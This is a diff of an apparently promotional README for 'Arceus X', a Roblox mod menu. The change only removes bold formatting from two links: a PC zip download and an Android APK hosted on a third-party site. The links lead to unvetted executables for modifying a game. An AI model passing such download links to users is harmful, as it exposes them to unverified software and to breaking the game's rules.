@@ -2,9 +2,9 @@
 
 [![Arceus X Mod](https://i.ibb.co/JQ933yb/arceus-x-mod-menu-showcase.png)](https://arceus-x.net/)
 
-** [CLICK HERE TO DOWNLOAD FOR PC](https://github.com/arceusx-roblox/arceusx-roblox.github.io/releases/download/v2/Arceus.X.zip) **
+[CLICK HERE TO DOWNLOAD FOR PC](https://github.com/arceusx-roblox/arceusx-roblox.github.io/releases/download/v2/Arceus.X.zip)
 -
-** [CLICK HERE FOR ANDROID APK](https://modmenu.vip/arceus-x/) **
+[CLICK HERE FOR ANDROID APK](https://modmenu.vip/arceus-x/)
 
 
 With the help of a Roblox mod menu like Arceus X, you can easily customize your game and make it more fun. A mod menu is a great way to add features that aren't normally available in the game. For example, you can use a mod menu to change the way your player looks, or to add new weapons to the game.
